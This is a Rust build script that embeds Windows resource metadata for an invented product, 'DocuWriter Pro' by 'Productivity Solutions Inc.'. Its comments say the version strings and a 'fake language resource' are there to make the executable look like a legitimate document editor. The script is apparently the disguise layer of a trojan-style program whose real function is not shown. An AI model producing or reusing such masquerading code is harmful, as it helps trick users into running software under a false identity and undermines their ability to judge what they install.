fn main() {
    // Only compile resources for Windows targets
    #[cfg(target_os = "windows")]
    {
        // Use winres crate to compile the .rc file and embed the icon
        let mut res = winres::WindowsResource::new();
        res.set_icon("rsrc/icon.ico");
        
        // Embed Windows manifest for proper execution level and compatibility
        res.set_manifest_file("rsrc/manifest.xml");
        
        // Set comprehensive version information to look like a legitimate document editor
        res.set("ProductName", "DocuWriter Pro");
        res.set("FileDescription", "Professional Document Editor and Word Processor");
        res.set("CompanyName", "Productivity Solutions Inc.");
        res.set("LegalCopyright", "Copyright © 2024-2026 Productivity Solutions Inc. All rights reserved.");
        res.set("OriginalFilename", "docuwriter.exe");
        res.set("InternalName", "DocuWriter");
        
        // Version information
        res.set("FileVersion", "3.2.1.0");
        res.set("ProductVersion", "3.2.1");
        
        // Additional metadata
        res.set("Comments", "Advanced document editing and formatting tools for professional users");
        res.set("LegalTrademarks", "DocuWriter is a trademark of Productivity Solutions Inc.");
        
        // Add fake language resource to look more legitimate
        // This adds a string table that makes it look like a properly localized app
        res.set_language(0x0409); // en-US
        
        // Compile the resource
        if let Err(e) = res.compile() {
            eprintln!("Warning: Failed to compile Windows resources: {}", e);
            eprintln!("The executable will be built without proper resources.");
        }
    }
    
    // Tell Cargo to rerun this build script if resources change
    println!("cargo:rerun-if-changed=rsrc/icon.ico");
    println!("cargo:rerun-if-changed=rsrc/manifest.xml");
}
